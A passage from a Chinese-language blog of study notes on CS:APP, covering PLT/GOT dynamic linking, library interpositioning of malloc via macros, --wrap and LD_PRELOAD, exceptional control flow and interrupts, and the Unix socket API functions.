<li>第3步：把偏移压栈，接着跳转plt[0]</li>
<li>第4步：把got[1]（link_map）压栈，跳转got[2]</li>
<li>第5步：got[2]中存放的<strong>动态链接器</strong>会根据“偏移”和“got[1]”查找libc库中的函数</li>
<li>第6步：找到对应函数后，进入函数，并且把got[n]对应位置写入libc函数的地址</li>
</ul>
<h2 id="库打桩机制"><a href="#库打桩机制" class="headerlink" title="库打桩机制"></a>库打桩机制</h2><p>linux链接器允许用户截获程序对共享库函数的调用，取而代之自己的代码，这种技术被称为<strong>“库打桩”</strong></p>
<p>利用“库打桩”，用户可以追踪某个函数的调用次数，验证和追踪它的输入值和输出值，或者把它替换为一个完全不同的实现</p>
<p><strong>基本思想</strong></p>
<p>先给定一个需要打桩的目标函数，创建一个包装函数（它的原型和目标函数一样），使用特殊的打桩机制，<strong>可以欺骗程序程序调用包装函数而不是目标函数</strong></p>
<p>假设有程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;malloc.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="built_in">malloc</span>(<span class="number">64</span>);</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>编译时打桩</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> malloc(size) mymalloc(size) <span class="comment">//把malloc全替换为mymalloc</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mymalloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> MYMOCK <span class="comment">//只有MYMOCK编译选项是，这段代码才会编译进去</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">/*打桩函数*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mymalloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ptr is %p\n&quot;</span>,ptr);</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>编译时打桩：主要利用了C预处理机制</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -MYMOCK -c mymalloc.c	</span><br><span class="line">$ gcc -I. -o test test.c mymalloc.o <span class="comment">//test就是目标文件</span></span><br></pre></td></tr></table></figure>
<p>参数 <strong>“- I.”</strong> 会告诉C预处理器，在搜索通常的系统目录之前，先在当前目录中查找“malloc.h”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./main</span><br><span class="line">ptr is <span class="number">0xdbd010</span></span><br></pre></td></tr></table></figure>
<p>可以发现：“malloc.h”被“mymalloc.o”调包了</p>
<p><strong>链接时打桩</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> malloc(size) mymalloc(size) <span class="comment">//把malloc全替换为mymalloc</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mymalloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> MYMOCK <span class="comment">//只有MYMOCK编译选项是，这段代码才会编译进去</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> *__real_malloc(<span class="keyword">size_t</span> size);<span class="comment">//注意声明</span></span><br><span class="line"><span class="comment">/*打桩函数*/</span></span><br><span class="line"><span class="keyword">void</span> *__wrap_malloc(<span class="keyword">size_t</span> size) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr = __real_malloc(size);<span class="comment">//最后会被解析成malloc</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ptr is %p\n&quot;</span>,ptr);</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>链接时打桩：linux静态链接器支持用 “—wrap，function”进行打桩 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -DMYMOCK mymalloc.c</span><br><span class="line">$ gcc -c main.c</span><br><span class="line">$ gcc -Wl,--wrap,<span class="built_in">malloc</span> -o test test.o mymalloc.o <span class="comment">//test就是目标文件</span></span><br></pre></td></tr></table></figure>
<p>“-Wl option”表示把“option”传递给链接器</p>
<p>“—wrap，malloc”告诉静态链接器：</p>
<p>把“malloc”解析为“ __wrap_malloc ”</p>
<p>把“ __real_malloc ”解析为“真正的malloc”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./main</span><br><span class="line">ptr is <span class="number">0x95f010</span></span><br></pre></td></tr></table></figure>
<p>可以发现：“malloc”被解析为了“ __wrap_malloc ”</p>
<p><strong>运行时打桩</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> MYMOCK <span class="comment">//只有MYMOCK编译选项是，这段代码才会编译进去</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE  <span class="comment">//这行特别注意加上</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> FILE *<span class="built_in">stdout</span>;</span><br><span class="line"><span class="comment">/*打桩的malloc函数*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> calltimes;</span><br><span class="line">    calltimes++;</span><br><span class="line">    <span class="comment">/*函数指针*/</span></span><br><span class="line">    <span class="keyword">void</span> *(*realMalloc)(<span class="keyword">size_t</span> size) = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> *error;</span><br><span class="line"></span><br><span class="line">    realMalloc = dlsym(RTLD_NEXT,<span class="string">&quot;malloc&quot;</span>);<span class="comment">//RTLD_NEXT</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">NULL</span> == realMalloc)</span><br><span class="line">    &#123;</span><br><span class="line">        error = dlerror();</span><br><span class="line">        <span class="built_in">fputs</span>(error,<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *ptr = realMalloc(size);</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> == calltimes)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr is %p\n&quot;</span>,ptr);</span><br><span class="line">    &#125; </span><br><span class="line">    calltimes = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>运行时打桩：可以通过设置LD_PRELOAD环境变量，达到在你加载一个动态库或者解析一个符号时，先从LD_PRELOAD指定的目录下的库去寻找需要的符号，然后再去其他库中寻找 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -DMYMOCK -shared -fPIC -o libmymalloc.so mymalloc.c -ldl</span><br><span class="line">    <span class="comment">//将mymalloc.c制作成动态库 &gt;&gt; libmymalloc.so</span></span><br><span class="line">$ LD_PRELOAD=<span class="string">&quot;./libmymalloc.so&quot;</span> <span class="comment">//设置LD_PRELOAD环境变量</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./main</span><br><span class="line">ptr is <span class="number">0x95f010</span></span><br></pre></td></tr></table></figure>
<p>可以发现：程序优先从”./libmymalloc.so”找到了“打桩malloc”</p>
<h2 id="异常控制流-ECF"><a href="#异常控制流-ECF" class="headerlink" title="异常控制流(ECF)"></a>异常控制流(ECF)</h2><p>程序可以使控制流发生“突变”来处理异常情况，这些“突变”就是<strong>异常控制流</strong></p>
<p>应用程序可以使用“陷阱（trap）”或者“系统调用（syscall）”的ECF形式，向操作系统请求服务：向磁盘中写数据，从网络中读数据，创建一个新进程，终止当前进程</p>
<h2 id="同步-amp-异步"><a href="#同步-amp-异步" class="headerlink" title="同步&amp;异步"></a>同步&amp;异步</h2><p>同步，是所有的操作都做完，才返回给用户结果，即写完数据库之后，在相应用户</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641808617642-1646286364493-1646808754597-1646808862602.png" class width="1641808617642">  
<p>异步，不用等所有操作等做完，就相应用户请求，即先相应用户请求，然后慢慢去写数据库</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641808601924-1646286364493-1646808754597-1646808862603.png" class width="1641808601924">  
<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>异常是控制流中的一种形式，它一部分由硬件实现，一部分由操作系统实现</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641795301380-1646286364493-1646808754597-1646808862603.png" class width="1641795301380"> 
<ul>
<li>CPU检测到flag寄存器中的异常数据</li>
<li>CPU控制IP指针，通过“异常表的跳转表”跳转对应的处理程序</li>
<li>处理完成后，进行相对应的操作（终止进程，继续进程，输出报错信息……）</li>
</ul>
<p>系统把每种类型的异常都分配了一个<strong>唯一非负</strong>的异常号</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641795607023-1646286364493-1646808754597-1646808862603.png" class width="1641795607023"> 
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641795655882-1646286364493-1646808754597-1646808862603.png" class width="1641795655882"> 
<p>异常表的基址放在一个叫<strong>异常表基址寄存器</strong>的特殊CPU寄存器中</p>
<p><strong>异常的类型</strong></p>
<p>异常分为4种：中断（interrupt），陷阱（trap），故障（fault），终止（abort）</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th>原因</th>
<th>异步/同步</th>
<th>返回行为</th>
</tr>
</thead>
<tbody>
<tr>
<td>中断</td>
<td>来自“I/O”设备的信号</td>
<td>同步&amp;异步</td>
<td>总是返回到下一条指令</td>
</tr>
<tr>
<td>陷阱</td>
<td>有意的异常</td>
<td>同步</td>
<td>总是返回到下一条指令</td>
</tr>
<tr>
<td>故障</td>
<td>潜在可恢复的错误</td>
<td>同步</td>
<td>可能返回到当前指令</td>
</tr>
<tr>
<td>终止</td>
<td>不可恢复的错误</td>
<td>同步</td>
<td>不会返回</td>
</tr>
</tbody>
</table>
</div>
<h2 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h2><p>中断程序信号处理的一种机制</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641809627084-1646286364493-1646808754597-1646808862603.png" class width="1641809627084"> 
<p>中断分为 <strong>内中断</strong> 和 <strong>外中断</strong></p>
<p><strong>内中断概述</strong></p>
<p>任何一个CPU都有一种能力：</p>
<p>可以在执行完<strong>当前指令</strong>后检测到从CPU内部产生的一种<strong>特殊信息</strong>，并立刻进行处理</p>
<p>这种特殊信息就是<strong>中断信息</strong></p>
<p>​        //中断信息要求CPU立马进行处理，并携带了必备的参数</p>
<p>内中断可以使计算机可以处理<strong>紧急情况</strong></p>
<p>内中断在程序中有意地产生，所以是主动的，也是<strong>“同步”</strong>的</p>
<p><strong>内中断产生</strong></p>
<p>1.除法错误（TF=0）</p>
<p>2.单步执行（TF=1）</p>
<p>3.执行”into”指令（TF=4）</p>
<p>4.执行”int  n”指令（TF=n）</p>
<p>对于8086CPU，这4种情况可以产生<strong>中断信息</strong></p>
<p><strong>外中断概述</strong></p>
<p>CPU除了进行运算以外，还要有对 <strong>I/O</strong> 能力（输入/输出），但是外设的输入输出 <strong>随时</strong> 可能发生，CPU必须要拥有可以 <strong>及时处理</strong> 这些信息的能力，这就引入了外中断的思想</p>
<p>这种中断发生完全是<strong>“异步”</strong>的，根本无法预测到此类中断会在什么时候发生</p>
<p><strong>外中断产生</strong></p>
<p>外设的输入将被存放在端口中，而其输入随时可能到达</p>
<p>信息到达时，外设的相关芯片会给CPU发出相应的<strong>中断信息</strong>，当CPU执行完当前的指令后，一旦检测到该<strong>中断信息</strong>，就会触发外中断，行为上和内中断相似</p>
<p>在PC系统中，外中断源一般有以下两类：</p>
<p>1.可屏蔽中断：</p>
<p>可屏蔽中断是CPU可以<strong>不响应</strong>的中断</p>
<p>其到底响不响应，主要是看<strong>IF</strong>寄存器（“<strong>IF</strong> = 1” ——&gt; 响应，“<strong>IF</strong> = 0” ——&gt; 不响应）</p>
<p>在CPU执行某个中断时，会把<strong>IF</strong>设置为“0”，可以暂时屏蔽其他中断</p>
<p>​        //指令sti：设置“IF=1”，指令cli：设置“IF=0”</p>
<p>2.不可屏蔽中断：</p>
<p>不可屏蔽中断是CPU必须执行的外中断，不可屏蔽中断<strong>不需要</strong>中断类型码，立即引发响应</p>
<p><strong>中断向量表</strong></p>
<p>中断向量表中保存了256个中断处理程序的入口</p>
<p>CPU接收到中断类型码后，就会根据中断类型表找到中断处理程序的入口</p>
<p><strong>中断过程</strong></p>
<p>1.CPU获取中断类型码</p>
<p>2.flag寄存器入栈（中断过程会改变flag寄存器）</p>
<p>3.设置flag寄存器的<strong>TF</strong>和<strong>IF</strong>为“0”</p>
<p>4.<strong>CS</strong>寄存器入栈</p>
<p>5.<strong>IP</strong>寄存器入栈</p>
<p>6.从中断向量表中读取中断处理程序的入口地址</p>
<p><strong>中断检查</strong></p>
<p>中断信息会被存储在flag寄存器的<strong>TF</strong>位中（TF = n：中断类型码为“n”）</p>
<p>CPU读取到此信息后就会开始<strong>中断过程</strong></p>
<h2 id="陷阱"><a href="#陷阱" class="headerlink" title="陷阱"></a>陷阱</h2><p>陷阱是有意的异常，是执行一条指令的结果</p>
<p>陷阱最重要的用途：在“用户程序”和“内核”之间提供一个一样的接口，称为<strong>系统调用</strong></p>
<p>处理器提供了一条特殊的指令：syscall，用于用户请求系统调用</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641808750527-1646286364493-1646808754597-1646808862603.png" class width="1641808750527"> 
<p>有些基于读写的操作必须要在 <strong>“内核模式”</strong> 中完成，而系统调用为了实现这些功能而诞生的，它通过提供 <strong>有权限限制</strong> 的  <strong>“内核模式”</strong> ，来实现一些 <strong>“用户模式”</strong> 无法办到的操作</p>
<p>用户程序通过系统调用从用户态（user mode）切换到核心态（ kernel mode ），从而可以访问相应的资源。这样做的好处是：</p>
<ul>
<li>为用户空间提供了一种硬件的抽象接口，使编程更加容易</li>
<li>有利于系统安全</li>
<li>有利于每个进程度运行在虚拟系统中，接口统一有利于移植</li>
</ul>
<p>当然，中断也可以实现系统调用（“int 80”）</p>
<h2 id="故障"><a href="#故障" class="headerlink" title="故障"></a>故障</h2><p>故障是由错误引起的，但是它<strong>可能</strong>可以被故障处理程序修正</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641809596891-1646286364493-1646808754597-1646808862603.png" class width="1641809596891"> 
<p>当发生故障时，处理器会将控制转移给<strong>故障处理程序</strong>：如果可以修正故障，那么程序将返回并继续执行，否则，程序将返回内核中的“abort例程”并终止该程序</p>
<h2 id="终止"><a href="#终止" class="headerlink" title="终止"></a>终止</h2><p>终止是不可恢复的致命错误的结果，通常是一些硬件错误</p>
<p>终止处理程序将直接<strong>终止</strong>目标程序，不会返回任何信息</p>
<h2 id="内核模式"><a href="#内核模式" class="headerlink" title="内核模式"></a>内核模式</h2><p>处理器通常是用某个控制寄存器中的<strong>模式位</strong>来表示“当前进程的特权”</p>
<p>共两种特权：“用户模式”，“内核模式”</p>
<h2 id="套接字接口"><a href="#套接字接口" class="headerlink" title="套接字接口"></a>套接字接口</h2><p><strong>套接字接口</strong>（socket interface）是一组函数，它们和 Unix I/O 函数结合起来，用以创建网络应用</p>
<p>大多数现代系统上都实现套接字接口，包括所有的 Unix 变种、Windows 和 Macintosh 系统</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1646286717853-1646657383406-1646808754597-1646808862603.png" class width="1646286717853">  
<p>​        // 从 Linux 内核的角度来看，一个套接字就是 <strong>通信的一个端点</strong> ，从 Linux 程序的角度来看，套接字就是一个 <strong>有相应描述符的打开文件</strong></p>
<p>因特网的套接字地址存放在所示的类型为 sockaddr_in 的 16 字节结构中（IP 地址和端口号总是以网络字节顺序（大端法）存放的）</p>
<p>下面将介绍套接字接口中的部分函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> domain, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span>;</span><br><span class="line"><span class="comment">// domain：即协议域，又称为协议族（family）</span></span><br><span class="line"><span class="comment">// type：指定socket类型</span></span><br><span class="line"><span class="comment">// protocol：指定协议</span></span><br></pre></td></tr></table></figure>
<p>​        // 协议族决定了 socket 的地址类型，在通信中必须采用对应的地址</p>
<p><strong>socket 函数</strong> 用于来返回一个 <strong>套接字描述符</strong> （clientfd）</p>
<ul>
<li>套接字描述符：用来标定系统为当前的进程划分的一块缓冲空间，类似于文件描述符 </li>
<li>文件描述符：是内核为了高效管理已被打开的文件所创建的索引，用于指代被打开的文件，对文件所有 I/O 操作相关的系统调用都需要通过文件描述符（open的返回值fd）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line"><span class="comment">// sockfd：需要绑定的socket</span></span><br><span class="line"><span class="comment">// *addr：存放了服务端用于通信的地址和端口</span></span><br><span class="line"><span class="comment">// addrlen: sizeof(sockaddr_in)</span></span><br></pre></td></tr></table></figure>
<p><strong>bind 函数</strong> 告诉内核将 addr 中的服务器套接字地址和套接字描述符 sockfd 联系起来</p>
<p>​        // bind函数把一个本地协议地址赋予一个套接字</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> clientfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line"><span class="comment">// clientfd：套接字描述符的一种</span></span><br><span class="line"><span class="comment">// addrlen：sizeof(sockaddr_in)</span></span><br></pre></td></tr></table></figure>
<p><strong>connect 函数</strong> 试图与 “套接字地址为 addr 的服务器” 建立一个因特网连接</p>
<p>如果成功，clientfd 描述符现在就准备好可以读写了(最好用 getaddrinfo 来为 connect 提供参数)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> backlog)</span></span>;</span><br><span class="line"><span class="comment">// sockfd：需要绑定的socket</span></span><br><span class="line"><span class="comment">// backlog：暗示了内核在开始拒绝连接请求之前，队列中要排队的未完成的连接请求的数量</span></span><br></pre></td></tr></table></figure>
<p><strong>listen 函数</strong> 将 sockfd 从一个 <strong>主动套接字</strong> 转化为一个 <strong>监听套接字</strong> （listening socket），该套接字可以接受来自客户端的连接请求</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> listenfd, struct sockaddr *addr, <span class="keyword">int</span> *addrlen)</span></span>;</span><br><span class="line"><span class="comment">// listenfd：服务器的socket描述符</span></span><br><span class="line"><span class="comment">// *addr：指向struct sockaddr *的指针</span></span><br><span class="line"><span class="comment">// *addrlen：协议地址的长度</span></span><br></pre></td></tr></table></figure>
<p><strong>accept 函数</strong> 等待来自客户端的连接请求到达侦听描述符 listenfd，然后在 addr 中填写客户端的套接字地址，并返回一个 <strong>已连接描述符</strong> </p>
<p>一个服务器通常通常仅仅只创建一个监听socket描述字，内核为每个由服务器进程接受的客户连接创建了一个已连接socket描述字，当服务器完成了对某个客户的服务，相应的已连接socket描述字就被关闭</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getaddrinfo</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *host, <span class="keyword">const</span> <span class="keyword">char</span> *service,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">const</span> struct addrinfo *hints,</span></span></span><br><span class="line"><span class="params"><span class="function">                struct addrinfo **result)</span></span>;</span><br><span class="line"><span class="comment">// host &amp; service：套接字地址的两个组成部分</span></span><br><span class="line"><span class="comment">// 可选的参数 hints 是一个 addrinfo 结构，它提供对 getaddrinfo 返回的套接字地址列表的更好的控制</span></span><br><span class="line"><span class="comment">// getaddrinfo 返回 result，result 一个指向 addrinfo 结构的链表</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeaddrinfo</span><span class="params">(struct addrinfo *result)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="title">gai_strerror</span><span class="params">(<span class="keyword">int</span> errcode)</span></span>; <span class="comment">// 返回：错误消息</span></span><br></pre></td></tr></table></figure>
<p><strong>getaddrinfo 函数</strong> 将主机名、主机地址、服务名和端口号的字符串表示转化成套接字地址结构，它是已弃用的 gethostbyname 和 getservbyname 函数的新的替代品 </p>
<p>在客户端调用了 getaddrinfo 之后，会遍历这个列表，依次尝试每个套接字地址，直到调用 socket 和 connect 成功，建立起连接，类似地，服务器会尝试遍历列表中的每个套接字地址，直到调用 socket 和 bind 成功，描述符会被绑定到一个合法的套接字地址，</p>
<ul>
<li>为了避免内存泄漏，应用程序必须在最后调用 freeaddrinfo，释放该链表</li>
<li>如果 getaddrinfo 返回非零的错误代码，应用程序可以调用 gai_streeror，将该代码转换成消息字符串</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">addrinfo</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span>             ai_flags;      <span class="comment">/* Hints argument flags */</span></span><br><span class="line">    <span class="keyword">int</span>             ai_family;     <span class="comment">/* First arg to socket function */</span></span><br><span class="line">    <span class="keyword">int</span>             ai_socktype;   <span class="comment">/* Second arg to socket function */</span></span><br><span class="line">    <span class="keyword">int</span>             ai_protocol;   <span class="comment">/* Third arg to socket function */</span></span><br><span class="line">    <span class="keyword">char</span>            *ai_canonname; <span class="comment">/* Canonical hostname */</span></span><br><span class="line">    <span class="keyword">size_t</span>          ai_addrlen;    <span class="comment">/* Size of ai_addr struct */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> *<span class="title">ai_addr</span>;</span>      <span class="comment">/* Ptr to socket address structure */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">addrinfo</span> *<span class="title">ai_next</span>;</span>      <span class="comment">/* Ptr to next item in linked list */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1646312037232-1646808754597-1646808862603.png" class width="1646312037232"> 
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getnameinfo</span><span class="params">(<span class="keyword">const</span> struct sockaddr *sa, <span class="keyword">socklen_t</span> salen,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">char</span> *host, <span class="keyword">size_t</span> hostlen,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">char</span> *service, <span class="keyword">size_t</span> servlen, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="comment">// *sa：指向大小为 salen 字节的套接字地址结构</span></span><br><span class="line"><span class="comment">// *host 指向大小为 hostlen 